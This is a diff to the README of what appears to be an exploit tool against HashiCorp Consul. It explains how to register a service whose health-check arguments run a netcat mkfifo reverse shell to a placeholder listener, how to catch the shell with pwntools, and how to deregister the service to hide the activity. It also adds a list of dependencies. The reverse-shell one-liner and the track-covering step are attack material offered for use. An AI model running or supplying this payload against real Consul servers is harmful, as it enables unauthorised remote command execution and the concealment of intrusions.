@@ -20,7 +20,7 @@ As [Consul documentation](https://developer.hashicorp.com/consul/api-docs/agent/
 ## Remote command execution
 The creation of this service requires an authentication token from the Consul service, also known as ACL Token. As we can see, we can declare a command inside the Check.Args parameter, and Consul will execute it for us. In this case, we want to execute a reverse shell to get access to the Consul server:
 
-  "Args":["sh", "-c","rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f"]
+`"Args":["sh", "-c","rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f"]`
   
 With this command, now we can bind for a connection with the help of the **shell** function of the Python library **pwntools**.
 
@@ -31,3 +31,9 @@ Consul returns an interactive console:
 ## Deleting the service
 Finally, we need to delete the service created in order to hide oir activity. This can be done making a PUT request to the /v1/agent/service/deregister/[NAME] endpoint, of course, still using the ACL Token from Consul.
 ![imagen](https://user-images.githubusercontent.com/25083316/206324287-f6ad616c-67f7-4e9a-b114-1f33ac50fd85.png)
+
+## Dependencies
+- requests
+- json
+- pwntools (can be installed via "pip install pwn")
+- threading
